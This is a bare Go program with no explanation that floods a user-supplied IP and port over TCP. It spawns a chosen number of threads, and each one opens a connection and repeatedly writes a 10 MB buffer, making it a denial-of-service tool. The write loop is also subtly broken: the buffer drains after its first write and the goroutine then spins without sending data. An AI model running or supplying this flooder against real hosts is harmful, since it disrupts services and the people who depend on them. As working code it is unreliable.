package main

import (
	"fmt"
	"net"
	"sync"
	"bytes"
	"os"
	"strconv"
)

func main() {
	var ipPort string
	var threads int
	var err error

	if len(os.Args) == 3 {
		ipPort = os.Args[1]
		threads, err = strconv.Atoi(os.Args[2])
		if err != nil {
			fmt.Println("Error: threads must be an integer")
			return
		}
	} else {
		fmt.Print("Enter IP:Port ")
		fmt.Scanf("%s", &ipPort)
		fmt.Print("Enter Number of Threads: ")
		fmt.Scanf("%d", &threads)
	}

	var wg sync.WaitGroup
	data := make([]byte, 1024*1024*10) // 10 MB of data

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("tcp", ipPort)
			if err != nil {
				fmt.Println("Dial error:", err)
				return
			}
			defer conn.Close()

			buf := bytes.NewBuffer(data)
			for {
				_, err := buf.WriteTo(conn) // Use buffer
				if err != nil {
					fmt.Println("WriteTo error:", err)
					break
				}
			}
		}()
	}

	wg.Wait()
}
